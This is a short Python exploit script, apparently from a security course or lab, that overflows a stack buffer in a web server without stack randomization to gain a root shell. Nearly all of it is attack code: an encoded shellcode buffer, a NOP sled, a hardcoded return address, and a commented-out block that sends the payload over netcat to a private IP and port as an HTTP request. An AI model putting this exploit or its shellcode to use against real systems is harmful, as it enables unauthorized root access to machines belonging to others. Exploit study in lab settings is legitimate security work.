#Author: Jigyas Sharma
#Brief Description: Exploit to get root shell from a net cat program which has no stack randomization.

import subprocess

buf =  b""
buf += b"\x89\xe3\xda\xdc\xd9\x73\xf4\x5e\x56\x59\x49\x49\x49"
buf += b"\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
buf += b"\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
buf += b"\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
buf += b"\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
buf += b"\x4a\x49\x56\x51\x49\x4b\x5a\x57\x4a\x43\x36\x33\x57"
buf += b"\x33\x46\x33\x53\x5a\x54\x42\x4b\x39\x4d\x31\x48\x30"
buf += b"\x53\x56\x48\x4d\x4b\x30\x4c\x53\x30\x59\x58\x30\x47"
buf += b"\x4f\x58\x4d\x4d\x50\x51\x59\x44\x39\x4c\x39\x32\x48"
buf += b"\x39\x50\x59\x38\x51\x30\x55\x5a\x53\x58\x33\x32\x53"
buf += b"\x30\x31\x33\x56\x46\x4c\x49\x4b\x51\x48\x30\x43\x56"
buf += b"\x50\x50\x30\x51\x51\x43\x4f\x43\x45\x53\x4b\x39\x4b"
buf += b"\x51\x38\x4d\x4b\x30\x30\x52\x32\x48\x42\x4e\x36\x4f"
buf += b"\x33\x43\x43\x58\x33\x58\x36\x4f\x46\x4f\x35\x32\x52"
buf += b"\x49\x4b\x39\x4d\x33\x31\x42\x50\x53\x4c\x49\x4b\x51"
buf += b"\x58\x30\x34\x4b\x58\x4d\x4b\x30\x41\x41"

#padding = 1030 - len(buf)
#print(padding)
overflow_string = b"\x90"*785+buf+b"\x90"*30+b"\xc1\xf7\xff\xbf"
send_string = b'helloworld' + overflow_string

#overflow_string = "\x90"*827+"\x46"*205+"\x42"*4

print(send_string)

#overflow_string = b"A"*825 + b"F"*205  + b"B" + b"C" + b"D" + b"E"
#overflow_string = b"\x90"*825+ buf + b"\xa0\xfa\xff\xbf"
#print(overflow_string)

'''
ip_add = "192.168.32.40"
nweb_port = 8888

command = f'echo "GET /{send_string} HTTP/1.0"|nc {ip_add} {nweb_port}'

try:
    subprocess.run(command, shell=True, check=True, text=True)
except subprocess.CalledProcessError as e:
    print(f"Failed to run command: {e}")
#'''
